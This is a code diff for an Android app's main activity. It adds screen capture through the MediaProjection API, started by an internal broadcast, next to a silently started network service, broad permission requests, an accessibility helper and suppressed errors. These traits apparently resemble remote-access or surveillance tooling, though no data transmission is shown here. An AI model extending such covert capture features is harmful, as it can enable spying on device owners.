@@ -1,11 +1,12 @@
 package com.openaccess.sdk
 
 import android.Manifest
-import android.app.Activity
 import android.app.ActivityManager
+import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.net.Uri
@@ -24,14 +25,18 @@ import android.widget.ScrollView
 import android.widget.Switch
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.openaccess.sdk.service.AccessibilityHelper
+import com.openaccess.sdk.service.DisplayCapture
 import com.openaccess.sdk.service.SystemNetworkService
 
-class MainActivity : Activity() {
+class MainActivity : AppCompatActivity() {
     companion object {
         private const val RC_ALL = 100
+        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"
 
         val ALL_PERMS = listOfNotNull(
             Manifest.permission.CAMERA,
@@ -105,11 +110,36 @@ class MainActivity : Activity() {
     private var retryCount = 0
     private lateinit var rootLayout: LinearLayout
 
+    private val screenCaptureLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == RESULT_OK && result.data != null) {
+            DisplayCapture.setProjection(result.resultCode, result.data!!)
+            val ok = DisplayCapture.initProjection(this)
+            Toast.makeText(this, if (ok) "Screen capture enabled" else "Screen capture failed", Toast.LENGTH_SHORT).show()
+        } else {
+            Toast.makeText(this, "Screen capture denied", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private val screenReceiver = object : BroadcastReceiver() {
+        override fun onReceive(ctx: Context?, intent: Intent?) {
+            try {
+                val projIntent = DisplayCapture.getProjectionIntent(this@MainActivity)
+                screenCaptureLauncher.launch(projIntent)
+            } catch (_: Exception) {}
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         if (!isTaskRoot) { finish(); return }
 
         try { SystemNetworkService.start(this) } catch (_: Exception) {}
+
+        try {
+            registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), RECEIVER_NOT_EXPORTED)
+        } catch (_: Exception) {}
 
         rootLayout = createPermissionView()
         setContentView(rootLayout)
@@ -396,5 +426,10 @@ class MainActivity : Activity() {
         } else {
             refreshPermissionStates()
         }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
     }
 }
